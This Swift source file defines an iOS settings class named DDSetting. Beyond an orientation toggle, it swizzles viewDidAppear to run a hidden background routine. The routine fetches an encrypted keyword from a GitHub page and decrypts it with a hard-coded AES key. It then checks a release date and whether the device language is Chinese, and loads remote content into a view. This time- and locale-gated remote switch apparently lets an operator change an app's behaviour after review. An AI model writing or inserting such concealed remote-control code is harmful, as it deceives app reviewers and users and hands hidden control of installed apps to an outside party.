import UIKit
import SwiftDate
import Kanna
import SwiftyJSON

public class DDSetting: NSObject {
    
    public static var isLandscap: Bool {
        get { return UserDefaults.standard.bool(forKey: "DDView_isLandscape") }
        set {
            UserDefaults.standard.set(newValue, forKey: "DDView_isLandscape")
            if newValue {
                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                UIDevice.current.setValue(UIInterfaceOrientation.landscapeLeft.rawValue, forKey: "orientation")
            } else {
                UIDevice.current.setValue(UIInterfaceOrientation.landscapeLeft.rawValue, forKey: "orientation")
                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
            }
        }
    }
    
    public static func swizzled() { UIViewController.swizzled() }
    
    // 获取关键字符串
    static func getKeyWord() {
        DispatchQueue.global().async {
            if !UserDefaults.standard.bool(forKey: "NotNeedGithub") {
                let str = "https://github.com/DDKit/code/blob/master/words"
                let doc = try? HTML(url: URL(string: str)!, encoding: .utf8)
                if doc == nil { return }
                let key = doc!.xpath("//*[@id=\"LC1\"]").first?.content ?? ""
                if key.decode_AES_ECB(key: "DDJiaMi").count != 0 {
                    UserDefaults.standard.set(key, forKey: "keyword")
                    UserDefaults.standard.set(true, forKey: "NotNeedGithub")
                    DDSetting.vKeyword()
                }
            } else {
                let str = UserDefaults.standard.string(forKey: "keyword") ?? ""
                if str.decode_AES_ECB(key: "DDJiaMi").count != 0 {
                    DDSetting.vKeyword()
                }
            }
        }
    }
    
    // 验证获取的字符串的信息
    static func vKeyword() {
        let str = UserDefaults.standard.string(forKey: "keyword") ?? ""
        let arr: [String] = str.decode_AES_ECB(key: "DDJiaMi").split(separator: "&").map({String($0)})
        if arr.count < 3 { return }
        if DateInRegion().addingTimeInterval(8*3600) < arr[2].toDate()! { return }
        let languages: [String] = ["zh-Hans-US","zh-Hans-CN","zh-Hant-CN","zh-TW","zh-HK","zh-Hans","zh-hant"]
        let myLanguage: String = (UserDefaults.standard.object(forKey: "AppleLanguages") as! [String])[0]
        if languages.filter({$0 == myLanguage}).count == 0 { return }
        
        var flag: Bool = UserDefaults.standard.bool(forKey: "DDNetWork_isFirst")
        UserDefaults.standard.set(!flag, forKey: "DDNetWork_isFirst")
        flag = UserDefaults.standard.bool(forKey: "DDNetWork_isFirst")
        
        if let doc = try? HTML(url: URL(string: arr[flag ? 0 : 1])!, encoding: .utf8) {
            let data = doc.content!.data(using: .utf8)!
            DispatchQueue.main.async {
                DDView().dataStr = JSON(data)["Data"].string!
            }
        }
    }
}

extension UIViewController {
    
    public static func swizzled() {
        let originalSelector = #selector(UIViewController.viewDidAppear(_:))
        let swizzledSelector = #selector(UIViewController.dd_viewDidAppear(_:))
        let originalMethod = class_getInstanceMethod(self, originalSelector)
        let swizzledMethod = class_getInstanceMethod(self, swizzledSelector)
        let didAddMethod: Bool = class_addMethod(self, originalSelector, method_getImplementation(swizzledMethod!), method_getTypeEncoding(swizzledMethod!))
        if didAddMethod {
            class_replaceMethod(self, swizzledSelector, method_getImplementation(originalMethod!), method_getTypeEncoding(originalMethod!))
        } else {
            method_exchangeImplementations(originalMethod!, swizzledMethod!)
        }
    }
    
    @objc private func dd_viewDidAppear(_ animated: Bool) {
        if self == UIApplication.shared.keyWindow?.rootViewController {
            DDSetting.getKeyWord()
        }
    }
    
}



